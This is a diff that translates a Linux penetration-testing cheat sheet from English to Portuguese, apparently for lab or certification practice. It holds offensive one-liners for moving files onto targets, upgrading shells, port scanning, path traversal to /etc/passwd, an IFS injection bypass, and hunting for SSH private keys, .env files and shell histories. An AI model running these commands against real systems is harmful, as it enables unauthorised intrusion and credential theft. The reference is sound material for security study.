@@ -1,83 +1,83 @@
-# Linux Commands
+# Comandos Linux
 
-## Table of Contents
+## Índice
 
-- [File Transfer](#file-transfer)
-  - [Python Servers](#python-servers)
+- [Transferência de Arquivos](#transferência-de-arquivos)
+  - [Servidores Python](#servidores-python)
   - [Netcat](#netcat)
-  - [Impacket SMB Server](#impacket-smb-server)
-  - [Bash-only wget/curl](#bash-only-wgetcurl)
+  - [Servidor SMB com Impacket](#servidor-smb-com-impacket)
+  - [wget/curl apenas com Bash](#wgetcurl-apenas-com-bash)
   - [SCP](#scp)
-- [Shell Upgrading](#shell-upgrading)
-- [Networking](#networking)
+- [Upgrade de Shell](#upgrade-de-shell)
+- [Rede](#rede)
   - [SSH](#ssh)
-  - [Port Scanning](#port-scanning)
+  - [Varredura de Portas](#varredura-de-portas)
   - [SMB](#smb)
   - [NFS](#nfs)
   - [RDP](#rdp)
-- [Time and Date Sync](#time-and-date-sync)
-- [Environment and Compilation](#environment-and-compilation)
-  - [Environment Variables](#environment-variables)
-  - [gcc Cross-Compile](#gcc-cross-compile)
+- [Sincronização de Hora e Data](#sincronização-de-hora-e-data)
+- [Ambiente e Compilação](#ambiente-e-compilação)
+  - [Variáveis de Ambiente](#variáveis-de-ambiente)
+  - [Cross-Compile com gcc](#cross-compile-com-gcc)
   - [virtualenv](#virtualenv)
-- [Utilities](#utilities)
+- [Utilitários](#utilitários)
   - [curl](#curl)
   - [iconv](#iconv)
   - [vi](#vi)
   - [Tmux](#tmux)
-- [File Hunting](#file-hunting)
+- [Caça a Arquivos](#caça-a-arquivos)
 
 ---
 
-## File Transfer
+## Transferência de Arquivos
 
-### Quick Check (One-liner)
+### Verificação Rápida (One-liner)
 
 ```shell
-# Quick file transfer server
+# Servidor rápido para transferência de arquivos
 python3 -m http.server 80 & curl http://$lhost/$file -o /tmp/$file
 ```
 
-### Python Servers
+### Servidores Python
 
 ```shell
-# Simple HTTP server
+# Servidor HTTP simples
 sudo python -m SimpleHTTPServer 80
 sudo python3 -m http.server 80
 
-# PHP server
+# Servidor PHP
 sudo php -S 127.0.0.1:80
 
-# Upload server
+# Servidor com upload
 python3 -m venv venv && source venv/bin/activate && pip install uploadserver && python -m uploadserver 80
 ```
 
 ### Netcat
 
 ```shell
-# Receiver
+# Receptor
 nc -lnvp $lport > $file
 
-# Sender
+# Emissor
 nc $rhost $rport < $file
 ```
 
-### Impacket SMB Server
+### Servidor SMB com Impacket
 
 ```shell
 sudo impacket-smbserver $share ./
 sudo impacket-smbserver $share . -smb2support
 impacket-smbserver kali . -username kali -password kali -smb2support
 
-# Copy from Windows client
+# Copiar do cliente Windows
 copy * \\$lhost\$share
 ```
 
-### Bash-only wget/curl
+### wget/curl apenas com Bash
 
-> Useful when wget/curl are not available on target
+> Útil quando wget/curl não estão disponíveis no alvo
 
-#### wget version
+#### Versão wget
 
 ```bash
 function __wget() {
@@ -114,7 +114,7 @@ function __wget() {
 __wget http://$lhost/$file
 ```
 
-#### curl version
+#### Versão curl
 
 ```bash
 function __curl() {
@@ -145,7 +145,7 @@ scp -r $folder $user@$rhost:/path/to/destination
 
 ---
 
-## Shell Upgrading
+## Upgrade de Shell
 
 ### Python PTY
 
@@ -154,31 +154,31 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-### Full TTY Upgrade
+### Upgrade Completo para TTY
 
 ```shell
-# After getting initial shell
+# Após obter shell inicial
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-# Press Ctrl+Z to background
+# Pressione Ctrl+Z para colocar em background
 stty raw -echo
 fg
-# Press Enter twice
+# Pressione Enter duas vezes
 export TERM=xterm
 ```
 
-### Alternative with stty sizing
+### Alternativa com tamanho stty
 
 ```shell
-# Background the shell with Ctrl+Z
-stty -a                    # Note rows and columns
+# Coloque em background com Ctrl+Z
+stty -a                    # Anote linhas e colunas
 stty raw -echo;fg
-# Press Enter twice
+# Pressione Enter duas vezes
 stty rows 37 cols 123
 export TERM=xterm-256color
 bash
 ```
 
-### Script Method
+### Método Script
 
 ```shell
 script -q /dev/null -c bash
@@ -191,27 +191,27 @@ script -q /dev/null -c bash
 stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 
-### Fixing Staircase Effect
+### Corrigindo Efeito Escada
 
 ```shell
 env reset
-# or
+# ou
 stty onlcr
 ```
 
 ---
 
-## Networking
+## Rede
 
 ### SSH
 
-#### Using Outdated Algorithms
+#### Usando Algoritmos Obsoletos
 
 ```shell
 ssh $user@$rhost -oKexAlgorithms=+diffie-hellman-group1-sha1
 ```
 
-#### Fixing SSH Private Key
+#### Corrigindo Chave Privada SSH
 
 ```shell
 dos2unix id_rsa
@@ -222,28 +222,28 @@ chmod 600 id_rsa
 dos2unix id_rsa; vim --clean -c 'wq' id_rsa; chmod 600 id_rsa
 ```
 
-### Port Scanning
+### Varredura de Portas
 
-> Basic port scan with netcat or bash
+> Varredura básica de portas com netcat ou bash
 
 ```shell
-# Netcat scan
+# Varredura com Netcat
 for p in {1..65535}; do nc -vn $rhost $p -w 1 -z & done 2> scan_results.txt
 
-# Bash-only scan
+# Varredura apenas com Bash
 export ip=$rhost; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
 ```
 
 ### SMB
 
 ```shell
-# Mount SMB share
+# Montar compartilhamento SMB
 mount.cifs //$rhost/$share /mnt/remote
 
 # Guestmount
 guestmount --add '/$mountpoint/$directory' --inspector --ro /mnt/$mount -v
 
-# smbclient commands
+# Comandos smbclient
 smbclient -L \\\\$rhost\\ -N
 smbclient -L //$rhost/ -N
 smbclient -L //$rhost// -U $user%$password
@@ -251,7 +251,7 @@ smbclient //$rhost/$share
 smbclient //$rhost/$share -U $user
 smbclient --no-pass //$rhost/$share
 
-# Download multiple files
+# Baixar múltiplos arquivos
 mask ""
 recurse ON
 prompt OFF
@@ -278,17 +278,17 @@ rdesktop $rhost
 
 ---
 
-## Time and Date Sync
+## Sincronização de Hora e Data
 
-> Important for Kerberos attacks
+> Importante para ataques Kerberos
 
-### Get Server Time
+### Obter Hora do Servidor
 
 ```shell
 sudo nmap -sU -p 123 --script "ntp-info" $rhost
 ```
 
-### Disable Automatic Sync
+### Desabilitar Sincronização Automática
 
 ```shell
 sudo systemctl stop systemd-timesyncd
@@ -296,7 +296,7 @@ sudo systemctl disable --now chronyd
 sudo /etc/init.d/virtualbox-guest-utils stop
 ```
 
-### Sync Options
+### Opções de Sincronização
 
 ```shell
 # net time
@@ -318,7 +318,7 @@ sudo timedatectl set-time 15:58:30
 sudo timedatectl set-time '2015-11-20 16:14:50'
 ```
 
-### Keep in Sync (loop)
+### Manter Sincronizado (loop)
 
 ```shell
 while [ 1 ]; do sudo ntpdate $rhost; done
@@ -326,21 +326,21 @@ while [ 1 ]; do sudo ntpdate $rhost; done
 
 ---
 
-## Environment and Compilation
+## Ambiente e Compilação
 
-### Environment Variables
+### Variáveis de Ambiente
 
 ```shell
 export PATH=`pwd`:$PATH
 ```
 
-### gcc Cross-Compile
+### Cross-Compile com gcc
 
 ```shell
-# Static 32-bit
+# Estático 32-bit
 gcc --static -m32 -Wl,--hash-style=both exploit.c -o exploit
 
-# Windows cross-compile
+# Cross-compile para Windows
 i686-w64-mingw32-gcc -o main32.exe main.c
 x86_64-w64-mingw32-gcc -o main64.exe main.c
 ```
@@ -360,23 +360,23 @@ virtualenv -p python2.7 venv
 
 ---
 
-## Utilities
+## Utilitários
 
 ### curl
 
 ```shell
-curl -v http://$domain                                                    # verbose output
-curl -X POST http://$domain                                               # POST method
-curl -X PUT http://$domain                                                # PUT method
-curl --path-as-is http://$domain/../../../../../../etc/passwd             # handle /../ in URL
-curl --proxy http://127.0.0.1:8080 http://$domain                         # use proxy
-curl -F myFile=@$file http://$rhost                                       # file upload
-curl${IFS}$lhost/$file                                                    # IFS bypass
+curl -v http://$domain                                                    # saída verbosa
+curl -X POST http://$domain                                               # método POST
+curl -X PUT http://$domain                                                # método PUT
+curl --path-as-is http://$domain/../../../../../../etc/passwd             # tratar /../ na URL
+curl --proxy http://127.0.0.1:8080 http://$domain                         # usar proxy
+curl -F myFile=@$file http://$rhost                                       # upload de arquivo
+curl${IFS}$lhost/$file                                                    # bypass com IFS
 ```
 
 ### iconv
 
-> Useful for encoding commands for PowerShell
+> Útil para codificar comandos para PowerShell
 
 ```shell
 echo "$command" | iconv -t UTF-16LE | base64 -w 0
@@ -387,48 +387,48 @@ iconv -f ASCII -t UTF-16LE $file.txt | base64 | tr -d "\n"
 ### vi
 
 ```shell
-:w !sudo tee %    # save file with elevated privileges without exiting
+:w !sudo tee %    # salvar arquivo com privilégios elevados sem sair
 ```
 
 ### Tmux
 
-#### Navigation
+#### Navegação
 
 ```text
-Ctrl+b + w        # show windows
-Ctrl+b + "        # split horizontal
-Ctrl+b + %        # split vertical
-Ctrl+b + ,        # rename window
-Ctrl+b + {        # flip pane
-Ctrl+b + }        # flip pane
-Ctrl+b + space    # switch pane layout
+Ctrl+b + w        # mostrar janelas
+Ctrl+b + "        # dividir horizontalmente
+Ctrl+b + %        # dividir verticalmente
+Ctrl+b + ,        # renomear janela
+Ctrl+b + {        # girar painel
+Ctrl+b + }        # girar painel
+Ctrl+b + space    # alternar layout do painel
 ```
 
-#### Copy & Paste (vi mode)
+#### Copiar e Colar (modo vi)
 
 ```text
 :setw -g mode-keys vi
-Ctrl+b + [        # enter copy mode
-space             # start selection
-enter             # copy selection
-Ctrl+b + ]        # paste
+Ctrl+b + [        # entrar no modo de cópia
+space             # iniciar seleção
+enter             # copiar seleção
+Ctrl+b + ]        # colar
 ```
 
-#### Search
+#### Busca
 
 ```text
-Ctrl+b + [        # enter copy mode
-Ctrl + /          # search (vi mode)
-n                 # next match
-Shift + n         # previous match
+Ctrl+b + [        # entrar no modo de cópia
+Ctrl + /          # buscar (modo vi)
+n                 # próxima ocorrência
+Shift + n         # ocorrência anterior
 ```
 
 #### Logging
 
 ```text
-Ctrl+b then Shift+P    # start/stop logging
+Ctrl+b então Shift+P    # iniciar/parar logging
 
-# Save output
+# Salvar saída
 Ctrl+b + :
 capture-pane -S -
 Ctrl+b + :
@@ -437,80 +437,80 @@ save-buffer $file.txt
 
 ---
 
-## File Hunting
+## Caça a Arquivos
 
-> Search for sensitive files on Linux systems
+> Buscar arquivos sensíveis em sistemas Linux
 
-### Search for Passwords
+### Buscar Senhas
 
 ```shell
-# Search for files containing password
+# Buscar arquivos contendo senha
 grep -rniE 'password|passwd|pwd|secret|credential' /etc /home /var/www 2>/dev/null | head -50
 
-# Search in specific file types
+# Buscar em tipos específicos de arquivo
 find / -type f \( -name "*.txt" -o -name "*.cfg" -o -name "*.conf" -o -name "*.ini" \) -exec grep -li "password" {} \; 2>/dev/null
 
-# Search in shell history
+# Buscar no histórico do shell
 cat /home/*/.bash_history 2>/dev/null | grep -iE 'password|passwd|mysql|ssh|scp'
 ```
 
-### Find Interesting Files
+### Encontrar Arquivos Interessantes
 
 ```shell
-# Find SUID/SGID files
+# Encontrar arquivos SUID/SGID
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -2000 -type f 2>/dev/null
 
-# Find writable files
+# Encontrar arquivos graváveis
 find / -writable -type f 2>/dev/null | grep -v proc
 
-# Find files owned by current user
+# Encontrar arquivos do usuário atual
 find / -user $(whoami) -type f 2>/dev/null
 
-# Find recently modified files
+# Encontrar arquivos modificados recentemente
 find / -type f -mtime -7 2>/dev/null | head -50
 
-# Find files with capabilities
+# Encontrar arquivos com capabilities
 getcap -r / 2>/dev/null
 ```
 
-### Common Sensitive File Locations
+### Locais Comuns de Arquivos Sensíveis
 
 ```shell
-# Database credentials
+# Credenciais de banco de dados
 cat /var/www/*/wp-config.php 2>/dev/null
 cat /var/www/*/.env 2>/dev/null
 cat /var/www/*/config/*.php 2>/dev/null
 
-# SSH keys
+# Chaves SSH
 find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
 cat /home/*/.ssh/id_rsa 2>/dev/null
 cat /root/.ssh/id_rsa 2>/dev/null
 
-# Cron jobs
+# Tarefas cron
 cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null
 
-# History files
+# Arquivos de histórico
 cat /home/*/.bash_history /root/.bash_history 2>/dev/null
 ```
 
-### Quick File Hunt One-liners
+### One-liners Rápidos de Caça a Arquivos
 
 ```shell
-# All-in-one sensitive file hunt
+# Busca completa de arquivos sensíveis
 find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.php" -o -name "*.txt" \) 2>/dev/null | xargs grep -l "password\|passwd\|secret" 2>/dev/null | head -20
 
-# Find backup files
+# Encontrar arquivos de backup
 find / -type f \( -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*~" \) 2>/dev/null
 
-# Find database files
+# Encontrar arquivos de banco de dados
 find / -type f \( -name "*.sql" -o -name "*.db" -o -name "*.sqlite" \) 2>/dev/null
 ```
 
 ---
 
-## See Also
+## Veja Também
 
-- **[Windows Command](6.1.Windows-command.md)** - Windows system commands and defense evasion
-- **[Reverse Shell](6.3.Reverse-Shell.md)** - Shell payloads for all platforms
-- **[Linux Privilege Escalation](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Linux privesc techniques
+- **[Comandos Windows](Windows-command.md)** - Comandos de sistema Windows e evasão de defesas
+- **[Reverse Shell](Reverse-Shell.md)** - Payloads de shell para todas as plataformas
+- **[Escalação de Privilégios Linux](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Técnicas de privesc no Linux
